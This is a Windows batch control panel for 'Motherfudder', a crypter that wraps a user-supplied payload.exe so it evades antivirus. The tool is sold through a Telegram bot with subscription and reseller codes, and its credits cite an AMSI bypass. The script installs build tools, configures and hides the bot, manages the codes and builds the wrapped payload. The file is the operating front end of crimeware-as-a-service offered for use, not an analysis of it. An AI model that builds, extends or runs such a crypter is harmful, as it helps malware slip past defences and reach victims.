@echo off
setlocal enabledelayedexpansion
title MOTHERFUDDER CRYPTER - Central Control Panel
color 0B

:MAIN_MENU
cls
echo.
echo  ================================================================
echo  =                                                              =
echo  =         MOTHERFUDDER CRYPTER - v1.0.0                        =
echo  =                                                              =
echo  =         Central Control Panel by Florin                      =
echo  =         Enhanced Fork of backdoorskid/Motherfudder           =
echo  =                                                              =
echo  ================================================================
echo.
echo  ================================================================
echo.
echo   [1] Install Prerequisites          (One-Click Setup)
echo   [2] Configure Telegram Bot         (Quick Wizard)
echo   [3] Manage Subscription Codes      (Add/Remove)
echo   [4] Host Telegram Bot              (Start/Stop)
echo   [5] Build CLI Mode                 (Manual Build)
echo   [6] Check for Updates              (Auto-Update)
echo   [7] Open Documentation             (Quick Access)
echo   [8] Help ^& Support                 (Troubleshooting)
echo   [9] Exit
echo.
echo  ================================================================
echo.
set /p choice="  Choose an option [1-9]: "

if "%choice%"=="1" goto INSTALL_PREREQS
if "%choice%"=="2" goto CONFIGURE_BOT
if "%choice%"=="3" goto MANAGE_CODES
if "%choice%"=="4" goto HOST_BOT
if "%choice%"=="5" goto BUILD_CLI
if "%choice%"=="6" goto CHECK_UPDATES
if "%choice%"=="7" goto OPEN_DOCS
if "%choice%"=="8" goto HELP_SUPPORT
if "%choice%"=="9" goto EXIT

echo.
echo  ERROR: Invalid choice! Please enter a number between 1-9.
pause
goto MAIN_MENU

:INSTALL_PREREQS
cls
echo.
echo  ================================================================
echo  =         INSTALL PREREQUISITES                                =
echo  ================================================================
echo.

:: Check for admin privileges
net session >nul 2>&1
if %ERRORLEVEL% NEQ 0 (
    echo  WARNING: ADMINISTRATOR REQUIRED
    echo.
    echo  This option needs to be run as Administrator.
    echo  Right-click MOTHERFUDDER.bat and select "Run as administrator"
    echo.
    pause
    goto MAIN_MENU
)

echo  This will install:
echo    * Chocolatey (Package Manager)
echo    * Rust + Cargo
echo    * .NET SDK 6.0
echo    * Visual Studio Build Tools
echo    * OpenSSL
echo    * Git
echo.
echo  Estimated time: 10-30 minutes (depending on internet speed)
echo.
set /p confirm="  Continue? (Y/N): "
if /i not "%confirm%"=="Y" goto MAIN_MENU

echo.
echo  ================================================================
echo  Installing Chocolatey...
echo  ================================================================
echo.

where choco >nul 2>&1
if %ERRORLEVEL% NEQ 0 (
    @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "[System.Net.ServicePointManager]::SecurityProtocol = 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))" && SET "PATH=%PATH%;%ALLUSERSPROFILE%\chocolatey\bin"
    echo  SUCCESS: Chocolatey installed!
) else (
    echo  INFO: Chocolatey already installed
)

echo.
echo  ================================================================
echo  Installing Rust + Cargo...
echo  ================================================================
echo.
choco install rust -y

echo.
echo  ================================================================
echo  Installing .NET SDK...
echo  ================================================================
echo.
choco install dotnet-sdk -y

echo.
echo  ================================================================
echo  Installing Visual Studio Build Tools...
echo  ================================================================
echo.
choco install visualstudio2022buildtools --package-parameters "--add Microsoft.VisualStudio.Workload.VCTools --add Microsoft.VisualStudio.Component.Windows10SDK --includeRecommended --includeOptional --passive --norestart" -y

echo.
echo  ================================================================
echo  Installing MinGW (includes dlltool)...
echo  ================================================================
echo.
choco install mingw -y

:: Also ensure it's in PATH
setx PATH "%PATH%;C:\ProgramData\chocolatey\lib\mingw\tools\install\mingw64\bin" /M >nul 2>&1
echo.
echo  MinGW installed! (dlltool.exe should now be available)

echo.
echo  ================================================================
echo  Installing OpenSSL...
echo  ================================================================
echo.
choco install openssl -y

echo.
echo  ================================================================
echo  Installing Git...
echo  ================================================================
echo.
choco install git -y

echo.
echo  ================================================================
echo  =         INSTALLATION COMPLETE!                               =
echo  ================================================================
echo.
echo  IMPORTANT: Close this window and open a NEW Command Prompt
echo  (This ensures environment variables are loaded)
echo.
echo  Next steps:
echo    1. Close this window
echo    2. Open a NEW Command Prompt (as Administrator)
echo    3. Run MOTHERFUDDER.bat again
echo    4. Press '2' to configure the bot
echo.
pause
goto MAIN_MENU

:CONFIGURE_BOT
cls
echo.
echo  ================================================================
echo  =         CONFIGURE TELEGRAM BOT                               =
echo  ================================================================
echo.
echo  This wizard will help you set up the Telegram bot.
echo.
pause

echo.
echo  ================================================================
echo  [STEP 1/2] Telegram Bot Token
echo  ================================================================
echo.
echo  How to get a bot token:
echo    1. Open Telegram and search for @BotFather
echo    2. Send /newbot
echo    3. Follow the prompts to create your bot
echo    4. Copy the bot token (looks like: 1234567890:ABCdef...)
echo.
set /p BOT_TOKEN="  Enter your bot token: "

if "%BOT_TOKEN%"=="" (
    echo.
    echo  ERROR: Bot token cannot be empty!
    pause
    goto MAIN_MENU
)

cd /d "%~dp0MfBuilder"
echo TELOXIDE_TOKEN=%BOT_TOKEN% > .env

echo.
echo  SUCCESS: Bot token saved!
echo.
echo  ================================================================
echo  [STEP 2/2] Authentication Key (Optional)
echo  ================================================================
echo.
echo  Current authentication key: MfCrypter2024
echo.
echo  Do you want to change it? (Y/N)
set /p change_key="  Choice: "

if /i "%change_key%"=="Y" (
    echo.
    set /p AUTH_KEY="  Enter new authentication key: "
    powershell -Command "(Get-Content 'src\telegram_bot.rs') -replace 'const VALID_KEY: &str = \".*\";', 'const VALID_KEY: &str = \"!AUTH_KEY!\";' | Set-Content 'src\telegram_bot.rs'"
    echo  SUCCESS: Authentication key updated!
)

cd ..

echo.
echo  ================================================================
echo  =         CONFIGURATION COMPLETE!                              =
echo  ================================================================
echo.
echo  Bot configured successfully!
echo.
echo  Next steps:
echo    * Press '3' to manage subscription codes
echo    * Press '4' to host the bot
echo    * Or press '6' to check for updates first
echo.
pause
goto MAIN_MENU

:MANAGE_CODES
cls
echo.
echo  ================================================================
echo  =         MANAGE SUBSCRIPTION CODES                            =
echo  ================================================================
echo.

:: Get the script directory and navigate to MfBuilder\src
set "SCRIPT_DIR=%~dp0"
cd /d "%SCRIPT_DIR%"

if not exist "MfBuilder\src\telegram_bot.rs" (
    echo  ERROR: telegram_bot.rs not found!
    echo  Location: %SCRIPT_DIR%MfBuilder\src\telegram_bot.rs
    echo.
    echo  Make sure you're running this from the project root directory.
    echo.
    pause
    goto MAIN_MENU
)

cd /d "%SCRIPT_DIR%MfBuilder\src"

:MANAGE_CODES_MENU
cls
echo.
echo  ================================================================
echo  =         MANAGE SUBSCRIPTION CODES                            =
echo  ================================================================
echo.
echo  ================================================================
echo  Current Subscription Codes:
echo  ================================================================
echo.

:: Display current codes (simpler approach)
echo  Reading from telegram_bot.rs...
echo.
findstr /C:"MFCRYPT" /C:"FLORIN" /C:"BACKDOORSKID" /C:"PREMIUM" /C:"TRIAL" /C:"CUSTOM" /C:"PROMO" telegram_bot.rs 2>nul | findstr /V "pub const" | findstr /V "//" >nul 2>&1
if errorlevel 1 (
    echo  * MFCRYPT-LIFETIME-2024
    echo  * FLORIN-VIP-BETA
    echo  * BACKDOORSKID-PRO
    echo  [Default codes - file may have other codes]
) else (
    for /f "delims=" %%a in ('findstr /C:"MFCRYPT" /C:"FLORIN" /C:"BACKDOORSKID" /C:"PREMIUM" /C:"TRIAL" /C:"CUSTOM" /C:"PROMO" telegram_bot.rs 2^>nul ^| findstr /V "pub const" ^| findstr /V "//"') do (
        set "line=%%a"
        set "line=!line:    =!"
        set "line=!line:"=!"
        set "line=!line:,=!"
        echo  * !line!
    )
)

echo.
echo  ================================================================
echo.
echo   [1] View Current Codes (Detailed)
echo   [2] Add New Code
echo   [3] Remove Code
echo   [4] Reset to Defaults
echo   [5] Back to Main Menu
echo.
set /p code_choice="  Choose an option [1-5]: "

if "%code_choice%"=="1" goto VIEW_CODES
if "%code_choice%"=="2" goto ADD_CODE
if "%code_choice%"=="3" goto REMOVE_CODE
if "%code_choice%"=="4" goto RESET_CODES
if "%code_choice%"=="5" (
    cd /d "%SCRIPT_DIR%"
    goto MAIN_MENU
)

echo.
echo  ERROR: Invalid choice!
pause
goto MANAGE_CODES_MENU

:VIEW_CODES
cls
echo.
echo  ================================================================
echo  =         CURRENT SUBSCRIPTION CODES                           =
echo  ================================================================
echo.
echo  File: MfBuilder/src/telegram_bot.rs
echo.
echo  ================================================================
echo.

:: Show the actual code block with context
for /f "tokens=1,* delims=:" %%a in ('findstr /N /C:"pub const SUBSCRIPTION_CODES" /A:10 telegram_bot.rs') do (
    echo  Line %%a: %%b
)

echo.
echo  ================================================================
echo.
echo  INFO: These codes can be used to activate subscriptions.
echo.
pause
goto MANAGE_CODES_MENU

:ADD_CODE
cls
echo.
echo  ================================================================
echo  =         ADD SUBSCRIPTION CODE                                =
echo  ================================================================
echo.
echo  Enter the subscription code you want to add.
echo.
echo  Format examples:
echo    * MYCODE-LIFETIME-2024
echo    * CUSTOM-VIP-123
echo    * PROMO-2024-SPECIAL
echo    * RESELLER-PREMIUM-2024
echo.
set /p new_code="  Enter new code: "

if "%new_code%"=="" (
    echo.
    echo  ERROR: Code cannot be empty!
    pause
    goto MANAGE_CODES_MENU
)

echo.
echo  Adding code: %new_code%
echo.

:: Backup original file
copy telegram_bot.rs telegram_bot.rs.backup >nul 2>&1

:: Use PowerShell to add the new code before the closing bracket
powershell -Command "$file = 'telegram_bot.rs'; $content = Get-Content $file -Raw; if ($content -match '(SUBSCRIPTION_CODES[^]]+)(\];)') { $content = $content -replace '(SUBSCRIPTION_CODES[^]]+)(\];)', ('$1' + \"    \"\"%new_code%\"\",`n\" + '$2'); Set-Content $file $content; exit 0 } else { exit 1 }"

if errorlevel 1 (
    echo  ERROR: Failed to add code!
    echo  Restoring backup...
    copy telegram_bot.rs.backup telegram_bot.rs >nul 2>&1
    del telegram_bot.rs.backup >nul 2>&1
    echo.
    pause
    goto MANAGE_CODES_MENU
) else (
    echo  SUCCESS: Code added!
    echo.
    echo  WARNING: You must rebuild the bot for changes to take effect!
    echo.
    echo  Steps:
    echo    1. Go back to main menu (Press 5)
    echo    2. Press 4 to host bot (this rebuilds automatically)
    echo    3. Wait for build to complete
    echo    4. Your new code will be active!
    echo.
)

del telegram_bot.rs.backup >nul 2>&1
pause
goto MANAGE_CODES_MENU

:REMOVE_CODE
cls
echo.
echo  ================================================================
echo  =         REMOVE SUBSCRIPTION CODE                             =
echo  ================================================================
echo.
echo  Enter the EXACT code you want to remove.
echo.
set /p remove_code="  Enter code to remove: "

if "%remove_code%"=="" (
    echo.
    echo  ERROR: Code cannot be empty!
    pause
    goto MANAGE_CODES_MENU
)

echo.
echo  Removing code: %remove_code%
echo.

:: Backup original file
copy telegram_bot.rs telegram_bot.rs.backup >nul 2>&1

:: Use PowerShell to remove the code line
powershell -Command "$file = 'telegram_bot.rs'; $content = Get-Content $file -Raw; $content = $content -replace '    \"%remove_code%\",(\r?\n)', ''; Set-Content $file $content"

if errorlevel 1 (
    echo  ERROR: Failed to remove code!
    echo  Restoring backup...
    copy telegram_bot.rs.backup telegram_bot.rs >nul 2>&1
) else (
    echo  SUCCESS: Code removed!
    echo.
    echo  WARNING: You must rebuild the bot for changes to take effect!
)

del telegram_bot.rs.backup >nul 2>&1
echo.
pause
goto MANAGE_CODES_MENU

:RESET_CODES
cls
echo.
echo  ================================================================
echo  =         RESET TO DEFAULT CODES                               =
echo  ================================================================
echo.
echo  WARNING: This will reset all codes to the defaults:
echo.
echo    * MFCRYPT-LIFETIME-2024
echo    * FLORIN-VIP-BETA
echo    * BACKDOORSKID-PRO
echo.
echo  All custom codes will be removed!
echo.
set /p confirm="  Continue? (Y/N): "

if /i not "%confirm%"=="Y" goto MANAGE_CODES_MENU

echo.
echo  Resetting codes...
echo.

:: Backup original file
copy telegram_bot.rs telegram_bot.rs.backup >nul 2>&1

:: Use PowerShell to reset to default codes
powershell -Command "$file = 'telegram_bot.rs'; $content = Get-Content $file -Raw; $pattern = 'pub const SUBSCRIPTION_CODES: &\[&str\] = &\[[^\]]*\];'; $replacement = 'pub const SUBSCRIPTION_CODES: &[&str] = &[\n    \"\"MFCRYPT-LIFETIME-2024\"\",\n    \"\"FLORIN-VIP-BETA\"\",\n    \"\"BACKDOORSKID-PRO\"\",\n];'; $content = $content -replace $pattern, $replacement; Set-Content $file $content"

if errorlevel 1 (
    echo  ERROR: Failed to reset codes!
    echo  Restoring backup...
    copy telegram_bot.rs.backup telegram_bot.rs >nul 2>&1
) else (
    echo  SUCCESS: Codes reset to defaults!
    echo.
    echo  WARNING: You must rebuild the bot for changes to take effect!
)

del telegram_bot.rs.backup >nul 2>&1
echo.
pause
goto MANAGE_CODES_MENU

:HOST_BOT
cls
echo.
echo  ================================================================
echo  =         HOST TELEGRAM BOT                                    =
echo  ================================================================
echo.

echo  Checking prerequisites...
echo.

:: Check for Rust/Cargo
where cargo >nul 2>&1
if %ERRORLEVEL% NEQ 0 (
    echo  ERROR: Cargo not found!
    echo.
    echo  Please install Rust first:
    echo    1. Press 9 to exit
    echo    2. Run MOTHERFUDDER.bat as Administrator
    echo    3. Press 1 to install prerequisites
    echo    4. Close this window and open a NEW terminal
    echo    5. Run MOTHERFUDDER.bat again
    echo.
    pause
    goto MAIN_MENU
)

:: Check for MinGW/dlltool
where dlltool >nul 2>&1
if %ERRORLEVEL% NEQ 0 (
    echo  WARNING: dlltool not found!
    echo  This is required for Windows builds.
    echo.
    echo  Attempting to install MinGW...
    echo.
    
    :: Check if we have admin rights
    net session >nul 2>&1
    if %ERRORLEVEL% NEQ 0 (
        echo  ERROR: Administrator rights required to install MinGW!
        echo.
        echo  Please:
        echo    1. Close this window
        echo    2. Right-click MOTHERFUDDER.bat
        echo    3. Select "Run as administrator"
        echo    4. Press 1 to install prerequisites
        echo.
        pause
        goto MAIN_MENU
    )
    
    :: Install MinGW
    choco install mingw -y
    
    :: Refresh PATH
    call refreshenv
    
    :: Check again
    where dlltool >nul 2>&1
    if %ERRORLEVEL% NEQ 0 (
        echo.
        echo  MinGW installed but dlltool not in PATH yet.
        echo.
        echo  IMPORTANT: You MUST close this window and open a NEW terminal!
        echo.
        echo  Steps:
        echo    1. Close this Command Prompt completely
        echo    2. Open a NEW Command Prompt (as Administrator)
        echo    3. Navigate back to this directory
        echo    4. Run MOTHERFUDDER.bat again
        echo    5. Press 4 to host bot
        echo.
        pause
        exit /b 0
    )
    
    echo  SUCCESS: MinGW installed and dlltool is now available!
    echo.
)

echo  Prerequisites OK!
echo.

echo  Choose hosting mode:
echo.
echo   [1] Foreground (Current window - Easy testing)
echo   [2] Background (Hidden - Production use)
echo   [3] Back to main menu
echo.
set /p host_mode="  Choice [1-3]: "

if "%host_mode%"=="3" goto MAIN_MENU

cd /d "%~dp0MfBuilder"

:: Check if .env exists
if not exist ".env" (
    echo.
    echo  ERROR: Bot not configured!
    echo  Please run option '2' first to configure the bot.
    echo.
    cd ..
    pause
    goto MAIN_MENU
)

if "%host_mode%"=="1" (
    echo.
    echo  ================================================================
    echo  Starting bot in FOREGROUND mode...
    echo  ================================================================
    echo.
    echo  INFO: Press Ctrl+C to stop the bot
    echo.
    echo  ================================================================
    echo.
    
    cargo run --release -- --bot
    
    echo.
    echo  ================================================================
    echo  Bot stopped.
    echo  ================================================================
    echo.
    cd ..
    pause
    goto MAIN_MENU
)

if "%host_mode%"=="2" (
    echo.
    echo  ================================================================
    echo  Starting bot in BACKGROUND mode...
    echo  ================================================================
    echo.
    
    start "MF-Crypter-Bot" /MIN cargo run --release -- --bot
    
    echo  SUCCESS: Bot started in background!
    echo.
    echo  The bot is now running in a minimized window.
    echo.
    echo  To stop the bot:
    echo    * Find "MF-Crypter-Bot" window in taskbar
    echo    * Close the window
    echo    * Or use Task Manager
    echo.
    cd ..
    pause
    goto MAIN_MENU
)

cd ..
goto MAIN_MENU

:BUILD_CLI
cls
echo.
echo  ================================================================
echo  =         BUILD CLI MODE                                       =
echo  ================================================================
echo.
echo  This will build the crypter in CLI mode.
echo.
echo  Before building:
echo    1. Configure MfBuilder/build.json
echo    2. Place your payload in MfBuilder/payload.exe
echo.
echo  Output will be in:
echo    * BAT mode: MfBuilder/out.bat
echo    * EXE mode: MfBuilder/out.exe
echo.
pause

cd /d "%~dp0MfBuilder"

where cargo >nul 2>&1
if %ERRORLEVEL% NEQ 0 (
    echo.
    echo  ERROR: Cargo not found!
    echo  Please install Rust by running option '1' first.
    echo.
    cd ..
    pause
    goto MAIN_MENU
)

if not exist "payload.exe" (
    echo.
    echo  WARNING: payload.exe not found!
    echo  Please place your payload in MfBuilder/payload.exe
    echo.
    set /p continue_anyway="  Continue anyway? (Y/N): "
    if /i not "!continue_anyway!"=="Y" (
        cd ..
        goto MAIN_MENU
    )
)

echo.
echo  ================================================================
echo  Building crypter...
echo  ================================================================
echo.

cargo run --release

echo.
if exist "out.bat" (
    echo  SUCCESS: Build successful!
    echo  Output: MfBuilder/out.bat
) else if exist "out.exe" (
    echo  SUCCESS: Build successful!
    echo  Output: MfBuilder/out.exe
) else (
    echo  ERROR: Build failed!
    echo  Check the error messages above.
)

echo.
cd ..
pause
goto MAIN_MENU

:CHECK_UPDATES
cls
echo.
echo  ================================================================
echo  =         CHECK FOR UPDATES                                    =
echo  ================================================================
echo.
echo  Checking for updates...
echo.

:: Check if git is available
where git >nul 2>&1
if %ERRORLEVEL% NEQ 0 (
    echo  WARNING: Git not installed!
    echo  Install Git by running option '1' first.
    echo.
    pause
    goto MAIN_MENU
)

:: Fetch latest from remote
git fetch origin >nul 2>&1

:: Check if there are updates
git status -uno | findstr /C:"Your branch is behind" >nul
if %ERRORLEVEL% EQU 0 (
    echo  NEW UPDATE AVAILABLE!
    echo.
    echo  ================================================================
    echo  What's New:
    echo  ================================================================
    echo.
    
    git log HEAD..origin/main --oneline --max-count=5
    
    echo.
    echo  ================================================================
    echo.
    set /p do_update="  Install update now? (Y/N): "
    
    if /i "!do_update!"=="Y" (
        echo.
        echo  Downloading update...
        git pull origin main
        
        echo.
        echo  SUCCESS: Update installed!
        echo.
        echo  Please restart MOTHERFUDDER.bat to use the new version.
        echo.
    ) else (
        echo.
        echo  INFO: Update skipped. You can update later from this menu.
    )
) else (
    echo  SUCCESS: You're running the latest version!
    echo.
    echo  Current version: v1.0.0
    echo  No updates available.
)

echo.
pause
goto MAIN_MENU

:OPEN_DOCS
cls
echo.
echo  ================================================================
echo  =         DOCUMENTATION                                        =
echo  ================================================================
echo.
echo  Available documentation:
echo.
echo   [1] Setup Guide (SETUP_GUIDE.md)
echo   [2] Features Guide (docs/FEATURES.md)
echo   [3] Bot Setup (docs/BOT_SETUP.md)
echo   [4] Installation Guide (docs/INSTALLATION.md)
echo   [5] FAQ (docs/BOT_PREVIEW.md)
echo   [6] Full Documentation Index (docs/DOCUMENTATION_INDEX.md)
echo   [7] Back to main menu
echo.
set /p doc_choice="  Choose [1-7]: "

if "%doc_choice%"=="1" start SETUP_GUIDE.md
if "%doc_choice%"=="2" start docs\FEATURES.md
if "%doc_choice%"=="3" start docs\BOT_SETUP.md
if "%doc_choice%"=="4" start docs\INSTALLATION.md
if "%doc_choice%"=="5" start docs\BOT_PREVIEW.md
if "%doc_choice%"=="6" start docs\DOCUMENTATION_INDEX.md
if "%doc_choice%"=="7" goto MAIN_MENU

echo.
echo  Opening documentation...
timeout /t 2 >nul
goto MAIN_MENU

:HELP_SUPPORT
cls
echo.
echo  ================================================================
echo  =         HELP ^& SUPPORT                                       =
echo  ================================================================
echo.
echo  ================================================================
echo  Quick Troubleshooting
echo  ================================================================
echo.
echo  Problem: OpenSSL error when building
echo  Solution: Run option '1' to reinstall prerequisites
echo.
echo  Problem: Bot not responding
echo  Solution: Check if bot is running (option '4')
echo            Verify bot token in MfBuilder/.env
echo.
echo  Problem: Build fails
echo  Solution: Ensure payload.exe exists in MfBuilder/
echo            Check build.json configuration
echo.
echo  Problem: Cargo not found
echo  Solution: Close terminal and open a NEW one
echo            Run option '1' to install Rust
echo.
echo  Problem: Subscription code not working
echo  Solution: Check codes with option '3'
echo            Rebuild bot after adding codes
echo.
echo  ================================================================
echo  Contact Support
echo  ================================================================
echo.
echo  * Telegram: @YourSupportBot
echo  * GitHub: Report issues on GitHub
echo  * Docs: Press '7' in main menu
echo.
echo  ================================================================
echo  Credits
echo  ================================================================
echo.
echo  Original: backdoorskid/Motherfudder
echo  Enhanced: Florin (+13,000 lines)
echo  AMSI: Chainski's GlobalAMSIBypass
echo.
echo  Please star both repositories if this helps you!
echo.
pause
goto MAIN_MENU

:EXIT
cls
echo.
echo  ================================================================
echo  =                                                              =
echo  =         Thank you for using Motherfudder!                    =
echo  =                                                              =
echo  =         Enhanced by Florin  ^|  Original by backdoorskid      =
echo  =                                                              =
echo  =         Please star the repo if it helps!                    =
echo  =                                                              =
echo  ================================================================
echo.
timeout /t 2 >nul
exit /b 0
